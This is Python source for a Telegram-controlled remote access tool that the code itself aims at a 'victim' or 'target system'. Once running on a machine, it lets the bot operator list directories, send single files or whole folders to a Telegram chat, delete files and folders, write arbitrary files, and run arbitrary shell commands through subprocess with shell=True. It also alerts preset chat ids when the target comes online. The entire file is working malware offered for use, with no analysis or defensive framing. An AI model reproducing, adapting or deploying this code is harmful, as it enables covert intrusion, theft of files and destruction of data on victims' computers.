import telebot
import os
import shutil
from requests.exceptions import ConnectionError
import subprocess

bot=telebot.TeleBot("")
chatids=["",""]
@bot.message_handler(commands=['start'])
def start(message):
    bot.reply_to(message,"Welcome to the hacking world!")
    #Add chat id to which you wanna want to send info of users using your bot.....
    for i in chatids:
        bot.send_message(i,f'''
    ~~~User Arrived~~~ Be careful if he is unknown to you.... 
    ## User info:
    # User name=@{message.chat.username}
    # User id={message.chat.id}
    # User's first name={message.chat.first_name}''')
@bot.message_handler(commands=['ls'])
def ls(message):
    bot.reply_to(message,"Enter the directory name of victim folder:")
    bot.register_next_step_handler(message,hack)

def hack(message):
    dir=message.text
    bot.reply_to(message,f"Getting access to {message.text}.Please wait.....")
    try:
        list=os.listdir(dir)

        for i in list:
            if os.path.isdir(f"{dir}/{i}"):   
                bot.send_message(message.chat.id,f"dir--{i}")
            else:
                bot.send_message(message.chat.id,i)
        bot.reply_to(message,"These are the all files and folders found in target dir.Wanna fetch one file(/file) or all files of a dir(/files) or delete some folder(/rmr) or file:(/rm)?")
    except:
        bot.reply_to(message,"Please enter valid victim folder's path.")

@bot.message_handler(commands=['file'])
def file(message):
    bot.reply_to(message,"Enter the file path:")
    bot.register_next_step_handler(message,filefetch)
def filefetch(message):
    bot.reply_to(message,"Fetching...Please wait......")
    try: 
        with open(message.text,"rb") as f:
            bot.send_document(message.chat.id,f)
        bot.reply_to(message,"File successfully fetched.")
    except:
        bot.reply_to(message,"File doesn't exist or couldn't be fetched.")


@bot.message_handler(commands=['files'])
def files(message):
    bot.reply_to(message,"Enter the directory path:")
    bot.register_next_step_handler(message,filesfetch)
def filesfetch(message):
    bot.reply_to(message,"Fetching files...Please wait......")
    try:
        for i in os.listdir(message.text):
            with open(f"{message.text}/{i}","rb") as f:
                bot.send_document(message.chat.id,f)
        bot.reply_to(message,f"Files of {message.text} successfully fetched.")
    except:
        bot.reply_to(message,"Dir doesn't exist or couldn't be fetched or may be somefiles couldn't be fetched. If you faced problems in /files command please use /file command to fetch each file individually.")

@bot.message_handler(commands=['rmr'])
def deleteFolder(message):
    bot.reply_to(message,"Please enter the full path of directory....")
    bot.register_next_step_handler(message,rmr)
def rmr(message):
    try:
        shutil.rmtree(message.text)
        bot.reply_to(message,f"{message.text} successfully gone.Check it by checking path: /check_path")
    except:
        bot.reply_to(message,"Folder doesn't exists or inaccessible.")
@bot.message_handler(commands=['rm'])
def deleteFile(message):
    bot.reply_to(message,"Please enter the full path of File....")
    bot.register_next_step_handler(message,rm)
def rm(message):
    try:
        os.remove(message.text)
        bot.reply_to(message,f"{message.text} successfully gone.Check it by checking path: /check_path")
    except:
        bot.reply_to(message,"File doesn't exists or inaccessible.")
@bot.message_handler(commands=['check_path'])
def checkpath(message):
    bot.reply_to(message,"Enter your path: ")
    bot.register_next_step_handler(message,check)
def check(message):
    try:
        if os.path.exists(message.text):
            bot.reply_to(message,f"Yes {message.text} exists. ")
        else:
            bot.reply_to(message,f"No.{message.text} doesn't exits on victim system.")
    except:
        bot.reply_to(message,"Please provide valid path.")

@bot.message_handler(commands=['vim'])
def create(message):
    bot.reply_to(message,"Enter the name of your file:")
    bot.register_next_step_handler(message,vim)
def vim(message):
    try:
        global filename
        filename=message.text
        with open(message.text,"w") as f:
            f.writelines("Null")
        bot.reply_to(message,"Enter content:")
        bot.register_next_step_handler(message,write)
        
            
    except:
        bot.reply_to(message,"Some error occured...please try again /vim")


def write(message):
    try:
        with open(filename,"w") as f:
            f.write(message.text)
        bot.reply_to(message,"File created to target side successfully.")
        bot.send_message(message.chat.id,"Want to execute?(/execute)")
    except:
        bot.reply_to(message,"File Creation Unsuccessful.....")
print("Bot Started.....")

@bot.message_handler(commands=['execute'])
def exec(message):
    bot.reply_to(message,"Enter your file path")
    bot.register_next_step_handler(message,execute)
def execute(message):
    try:
        # os.system(message.text)
        subprocess.run([message.text], shell=True)
        bot.reply_to(message,"Execution successful.")
    except:
        bot.reply_to(message,"Execution Unsuccessful")

#Add below the chatid's to which you wanna forward alart when victic is online.
for j in chatids:
    bot.send_message(j,"Target system is on......")
while True:
    try:
        bot.polling(none_stop=True)
    except ConnectionError as e:
        print(f"Connection error: {e}. Retrying...")
        # Implement your retry logic here or just pass to retry on the next loop iteration
    except Exception as e:
        print(f"An unexpected error occurred: {e}")
# bot.polling()
